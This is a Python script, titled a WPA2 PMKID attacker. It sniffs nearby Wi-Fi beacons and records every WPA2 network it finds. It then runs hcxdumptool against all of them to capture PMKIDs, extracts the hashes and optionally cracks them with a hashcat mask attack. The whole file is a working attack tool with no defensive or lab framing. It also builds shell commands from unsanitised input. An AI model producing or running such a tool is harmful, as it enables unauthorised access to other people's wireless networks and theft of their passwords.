#!/usr/bin/python3

# Please ensure all dependencies are met, by running dependencies.sh
# Please make sure all tools in the dependencies are the latest version too.

import re, argparse, os, datetime, sys, subprocess
from scapy.all import *

foundssids = "foundssids.txt"

def insert_ap(pkt):
    bssid = pkt[Dot11].addr3
    
    if bssid in aps:
        return
        
    p = pkt[Dot11Elt]
    cap = pkt.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}"
                      "{Dot11ProbeResp:%Dot11ProbeResp.cap%}").split('+')
    ssid, channel = None, None
    crypto = set()
    
    while isinstance(p, Dot11Elt):
    
        if p.ID == 0:
            ssid = p.info
            
        elif p.ID == 3:
            channel = ord(p.info)
            
        elif p.ID == 48:
            crypto.add("WPA2")
            
        elif p.ID == 221 and p.info.startswith(b'\x00P\xf2\x01\x01\x00'):
            crypto.add("WPA")
            
        p = p.payload
        
    if not crypto:
    
        if 'privacy' in cap:
            crypto.add("WEP")
            
        else:
            crypto.add("OPN")
    
    crypto_string = ' / '.join(crypto)
    oneliner = f"NEW AP: {ssid.decode()} [{bssid}], channel {str(channel)}, {crypto_string}"
    print(f"[+] {oneliner}.")
    fssid_file = open(foundssids, "a+")
    fssid_file.write(oneliner + "\n")
    fssid_file.close()
    aps[bssid] = (ssid, channel, crypto)

def mainProgram(interface):
    purifiedbssids = []
    newfile = open(foundssids, "w+")
    newfile.close()
    print("[+] Scanning for networks, press CTRL + C when you wish to stop the scan and continue the program.")

    # try:
    sniff(iface=interface, prn=insert_ap, store=False, lfilter=lambda p: (Dot11Beacon in p or Dot11ProbeResp in p))

    # except Exception as e:
    #     print(f"[-] {e}.")

    try:
    
        with open(foundssids) as bssidlist:
            bssidlines = bssidlist.read().splitlines()
            
            for bssidline in bssidlines:
                wpa2bssidregex = re.findall(r"NEW\sAP\:\s.*\s\[((?:[A-Fa-f0-9]{2}[:-]){5}(?:[A-Fa-f0-9]{2}))\]\,\schannel\s\d{1,2}\,\sWPA2", bssidline)
                
                if wpa2bssidregex:

                    for wpa2bssid in wpa2bssidregex:
                        bssid = str(wpa2bssid)
                        
                        if ":" in bssid:
                            bssid = bssid.replace(":","")
                            print(f"[+] Found and using the WPA2 Network: {bssid}.")
                            purifiedbssids.append(bssid)
                        
                        else:
                            purifiedbssids.append(bssid)
                        
        bssidlist.close()

    except:
        sys.exit(f"[-] Failed to open file: {foundssids}.")

    print("[+] Generating filter file of BSSIDs.")
    filterfile = open("filter.txt", "w+")
    filterfile.close()
    filterfile = open("filter.txt", "a+")
    purebssids = "\n".join(purifiedbssids)
    print(purifiedbssids)
    count = len(purifiedbssids)
    filterfile.write(purebssids)
    filterfile.close()        
    timeout = (count * 180)
    timeout_minutes = (timeout / 60)
    print(f"[+] Finished. Now will attempt to find PMKIDs. Estimated Time until Completion: {str(timeout_minutes)} minutes.")
    outfile = "foundhash.pcapng"
    hashfile = "extractedhashes.txt"
    
    if os.path.isfile(outfile):
        os.remove(outfile)
        
    print(f"timeout {str(timeout)} hcxdumptool -o {outfile} -i {interface} --filterlist_ap=filter.txt --filtermode=2 --enable_status=1,2,4,8")
    os.system(f"timeout {str(timeout)} hcxdumptool -o {outfile} -i {interface} --filterlist_ap=filter.txt --filtermode=2 --enable_status=1,2,4,8")
    
    print(f"\n[+] Finished. Now extracting hashes from {outfile}.")
    os.system(f"hcxpcaptool -z {hashfile} {outfile}")
    
    return hashfile

def MonitorMode(interface, operation):

    if operation == "Start":
        print("[+] Putting interface in monitor mode.")
        cmd = subprocess.run(['airmon-ng', 'start', interface], stdout=subprocess.PIPE)
        cmd_output = cmd.stdout.decode()
        CMD_Regex = re.search(r"monitor\smode\svif\senabled\sfor\s[\[\]\w\d]+\son\s\[phy0\]([\w\d]+)", cmd_output)

        if CMD_Regex:
            print(CMD_Regex.group(1))
            return CMD_Regex.group(1)

        else:
            return None

    elif operation == "Stop":
        cmd = subprocess.run(['airmon-ng', 'stop', interface], stdout=subprocess.PIPE)

def HashcatCrack(hashfile):
    print("[+] Now cracking hashes with Hashcat.")
    os.system(f"hashcat -m 16800 {hashfile} -a 3 -w 3 '?l?l?l?lre123' --force")

if __name__ == "__main__":

    # try:
    parser = argparse.ArgumentParser(description='WPA2 PMKID Attacker.')
    parser.add_argument('-c', '--crack', help='This optional argument is used to specify whether the machine should proceed to crack discovered hashes.')
    parser.add_argument('-i', '--interface', help='This necessary argument is used to specify the wireless interface. Must be in monitor mode.')
    parser.add_argument('-m', '--monitor', help='This optional argument is used to specify that the interface is not currently in monitor mode, and should be. This argument will not run airodump, not get a list of BSSIDs for you.')
    args = parser.parse_args()

    hashfile = []
    aps = {}

    if not args.interface:
        sys.exit("[-] Please specify an interface.")

    int_regex = re.search(r"\w{1,8}", args.interface)

    if not int_regex:
        sys.exit("[-] Please specify a valid interface.")

    interface = args.interface

    if args.monitor:
        interface = MonitorMode(interface, "Start")

    if interface:
        hashfile = mainProgram(interface)

    if args.monitor:
        MonitorMode(interface, "Stop")

    if args.crack and hashfile:
        HashcatCrack(hashfile)

    # except Exception as e:
    #     sys.exit(f"[-] {e}.")